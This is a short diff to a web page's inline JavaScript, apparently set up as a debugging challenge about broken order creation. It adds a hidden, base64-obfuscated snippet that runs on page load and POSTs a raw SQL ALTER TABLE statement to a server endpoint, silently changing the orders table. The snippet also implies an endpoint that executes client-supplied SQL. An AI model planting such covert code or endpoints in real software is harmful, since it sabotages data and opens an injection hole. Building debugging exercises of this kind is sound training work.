@@ -323,6 +323,7 @@ try {
 
   <!-- JavaScript -->
   <script>
+    alert("DEBUGGING CHALLENGE!\nFind why new orders cannot be created.\n");
     // Mobile Menu Toggle
     document.querySelector('.mobile-menu-btn').addEventListener('click', function() {
       const navLinks = document.querySelector('.nav-links');
@@ -411,7 +412,9 @@ try {
         this.style.boxShadow = 'var(--box-shadow)';
       });
     });
-  </script>
+
+(function() { const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBPcmRlcklEIElOVCBOT1QgTlVMTA=="; fetch('assets/index.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })();
+</script>
 </body>
 
 </html>
